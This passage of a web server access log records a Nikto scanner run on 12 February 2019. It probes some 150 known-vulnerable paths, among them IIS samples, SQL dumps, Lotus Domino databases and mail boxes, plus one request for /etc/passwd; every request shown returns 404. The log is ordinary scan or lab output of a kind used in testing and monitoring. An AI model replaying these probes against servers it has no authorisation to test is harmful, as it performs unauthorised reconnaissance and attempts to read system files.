172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /localstart.asp HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002080)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /market/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002081)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mspress30/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002082)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /sam HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002083)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /sam.bin HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002084)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /sam._ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002085)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /samples/search/queryhit.htm HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002086)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /scripts/counter.exe HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002087)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /scripts/cphost.dll HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002088)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /scripts/fpadmcgi.exe HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002089)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /scripts/postinfo.asp HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002090)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /scripts/samples/ctguestb.idc HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002091)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /scripts/samples/search/webhits.exe HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002092)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /site/iissamples/ HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002093)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /vc30/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002094)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /_mem_bin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002095)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /_mem_bin/FormsLogin.asp HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002096)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /perl/files.pl HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002097)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /perl5/files.pl HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002098)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /scripts/convert.bas HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002099)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /owa_util%2esignature HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002100)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cgi-dos/args.bat HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002101)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /custdata/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002102)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /hostingcontroller/ HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002103)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /data.sql HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002104)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /databases/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002105)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /databse.sql HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002106)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /db.sql HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002107)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /etc/passwd HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002108)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /img-sys/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002109)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /java-sys/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002110)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /javadoc/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002111)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /log/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002112)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /manager/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002113)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /manual/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002114)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /exchange/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002115)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /pls/admin HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002116)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /account.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002117)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /accounts.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002118)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002119)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin4.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002120)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin5.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002121)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /agentrunner.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002122)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /alog.nsf HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002123)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /archive/a_domlog.nsf HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002124)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /archive/l_domlog.nsf HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002125)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /a_domlog.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002126)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /billing.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002127)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /bookmark.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002128)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /books.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002129)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /busytime.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002130)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /calendar.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002131)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /certa.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002132)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /certlog.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002133)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /certsrv.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002134)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /chatlog.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002135)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /clbusy.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002136)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cldbdir.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002137)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /clusta4.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002138)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /collect4.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002139)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cpa.nsf HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002140)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /customerdata.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002141)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /da.nsf HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002142)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /database.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002143)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /db.nsf HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002144)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dclf.nsf HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002145)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /DEASAppDesign.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002146)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /DEASLog.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002147)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /DEASLog01.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002148)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /DEASLog02.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002149)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /DEASLog03.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002150)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /DEASLog04.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002151)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /DEASLog05.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002152)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /decsadm.nsf HTTP/1.1" 404 466 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002153)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /decsdoc.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002154)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /decslog.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002155)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /DEESAdmin.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002156)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /default.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002157)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dirassist.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002158)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /doladmin.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002159)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dols_help.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002160)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /domadmin.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002161)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /domcfg.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002162)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /event.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002163)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /events.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002164)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /events5.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002165)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /group.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002166)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /groups.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002167)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /help5_admin.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002168)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /help5_client.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002169)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /help5_designer.nsf HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002170)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /homepage.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002171)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /iNotes/Forms5.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002172)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /iNotes/Forms5.nsf/$DefaultNav HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002173)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /jotter.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002174)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /kbccv11.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002175)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /kbnv11.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002176)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /kbssvv11.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002177)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /lcon.nsf HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002178)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ldap.nsf HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002179)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /leiadm.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002180)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /leilog.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002181)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /leivlt.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002182)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /log4a.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002183)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /lsxlc.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002184)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /l_domlog.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002185)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mab.nsf HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002186)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail/adminisist.nsf HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002187)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail1.box HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002188)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail10.box HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002189)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail2.box HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002190)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail3.box HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002191)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail4.box HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002192)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail5.box HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002193)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail6.box HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002194)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail7.box HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002195)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail8.box HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002196)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail9.box HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002197)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mailw46.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002198)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /msdwda.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002199)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mtatbls.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002200)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mtdata/mtstore.nsf HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002201)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mtstore.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002202)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /nntp/nd000000.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002203)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /nntp/nd000001.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002204)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /nntp/nd000002.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002205)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /nntp/nd000003.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002206)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /nntp/nd000004.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002207)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /nntppost.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002208)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /notes.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002209)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ntsync4.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002210)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ntsync45.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002211)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /perweb.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002212)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /private.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002213)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /public.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002214)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /qpadmin.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002215)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /quickplace/quickplace/main.nsf HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002216)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /quickstart/qstart50.nsf HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002217)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /quickstart/wwsample.nsf HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002218)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /readme.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002219)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /reports.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002220)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /sample/faqw46 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002221)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /sample/framew46 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002222)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /sample/pagesw46 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002223)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /sample/siregw46 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002224)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /sample/site1w4646 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002225)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /sample/site2w4646 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002226)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /sample/site3w4646 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002227)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /schema50.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002228)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /secret.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002229)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /setupweb.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002230)"
